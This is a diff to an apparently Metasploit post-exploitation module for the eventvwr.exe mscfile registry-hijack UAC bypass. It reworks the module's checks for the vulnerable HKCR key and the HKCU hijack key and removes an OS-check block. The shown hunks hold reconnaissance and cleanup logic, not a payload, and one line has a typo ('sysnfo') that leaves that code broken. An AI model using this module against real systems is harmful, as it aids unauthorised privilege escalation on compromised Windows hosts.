@@ -283,10 +283,10 @@ def ls_stage2
  Rex::sleep(3.0)
 
       # check if remote registry hive keys was deleted successefuly
-      if not registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-        print_status("Registry hive keys deleted successefuly!")
-      else
+      if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
         print_error("Module can not verifie if deletion has successefully!")
+      else
+        print_status("Registry hive keys deleted successefuly!")
       end
 
     Rex::sleep(1.0)
@@ -311,7 +311,6 @@ def ls_stage3
 
   r=''
   session = client
-  vuln_valu = "(Default)"                            # value name
   vuln_soft = "eventvwr.exe"                         # vulnerable software name
   vuln_hive = "HKCR\\mscfile\\shell\\open\\command"  # vulnerable hive key call (mmc.exe)
   vuln_key = "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # vuln hijack key
@@ -329,34 +328,29 @@ def ls_stage3
     print_warning("Reading proccess registry hive keys...")
     Rex::sleep(1.0)
     # check target registry hive/key settings
-    check_vuln_call = registry_getvaldata(vuln_hive,vuln_valu)
-    if check_vuln_call.nil? || check_vuln_call == 0
-      hive_status = "NOT FOUND"
+    if registry_enumkeys("HKCR\\mscfile\\shell\\open\\command")
+      report_on = "exploitable"
     else
-      hive_status = "#{check_vuln_call}"
+      vuln_hive = "NOT FOUND"
+      report_on = "not exploitable"
     end
 
-      # check target registry hive/key settings
-      if not registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
-        vuln_key = "NOT FOUND"
-      end
-
     # check target registry hive/key settings
-    check_vuln_key = registry_getvaldata(vuln_key,vuln_valu)
-    if check_vuln_key.nil? || check_vuln_key == 0
-      key_status = "NOT FOUND"
+    if registry_enumkeys("HKCU\\Software\\Classes\\mscfile\\shell\\open\\command")
+      report_tw = "hijack hive present"
     else
-      key_status = "#{check_vuln_key}"
+      vuln_key = "NOT FOUND"
+      report_tw = "hijack hive not present"
     end
 
   print_line("")
   # display target registry settings to user...
   print_line("VULNERABLE_SOFT : #{vuln_soft}")
   print_line("    VULN_HIVE   : #{vuln_hive}")
-  print_line("    KEY_DATA    : #{hive_status}")
+  print_line("    KEY_INFO    : #{report_on}")
   print_line("")
   print_line("    HIJACK_HIVE : #{vuln_key}")
-  print_line("    KEY_DATA    : #{key_status}")
+  print_line("    KEY_INFO    : #{report_tw}")
   print_line("")
 Rex::sleep(0.5)
 end
@@ -364,7 +358,6 @@ end
 
 
 
-#TODO: check IF sysinfo['OS'] =~ gives error
 # ------------------------------------------------
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
 # Running sellected modules against session target
@@ -399,11 +392,6 @@ def run
     # the 'def check' funtion that rapid7 requires.
     # Guidelines for Accepting Modules: goo.gl/OQ6HEE
     #
-    # check for proper operative system 
-    if sysinfo['OS'] =~ /Windows (7|8|2008|2012|10)/
-      print_error("[ ABORT ]:This post-module only works against windows systems")
-      raise Rex::Script::Completed
-    end
     # check for proper session (meterpreter)
     if not sysinfo.nil?
       print_status("Running module against: #{sysnfo['Computer']}")
